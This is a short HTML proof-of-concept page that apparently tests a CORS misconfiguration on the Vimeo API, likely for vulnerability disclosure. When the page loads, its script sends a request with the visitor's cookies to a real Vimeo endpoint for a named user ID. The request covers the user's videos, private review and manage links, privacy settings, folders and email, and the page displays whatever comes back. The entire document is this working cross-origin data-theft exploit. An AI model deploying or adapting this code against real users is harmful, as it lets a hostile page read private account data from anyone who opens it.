<!DOCTYPE html>
<html>
  <head>
    <title>Vimeo CORS PoC</title>
  </head>
  <body>
    <h1>Testing CORS Misconfiguration on Vimeo API</h1>
    <pre id="output">Waiting...</pre>

    <script>
      async function testVimeo() {
        try {
          const response = await fetch("https://api.vimeo.com/users/244943635/items?per_page=4&fields=type,video.id,video.name,video.uri,video.last_user_action_event_date,video.link,video.review_page.link,video.pictures,video.metadata.interactions.edit,video.manage_link,video.privacy.view,meta,folder.name,folder.uri,folder.last_user_action_event_date,folder.metadata.connections.items.uri,folder.metadata.connections.items.total,email&sort=last_user_action_event_date", {
            credentials: "include" // send cookies/JWT automatically
          });

          const text = await response.text();
          document.getElementById("output").innerText = text;
          console.log("Response from Vimeo API:", text);
        } catch (err) {
          document.getElementById("output").innerText = "Error: " + err;
        }
      }

      testVimeo();
    </script>
  </body>
</html>
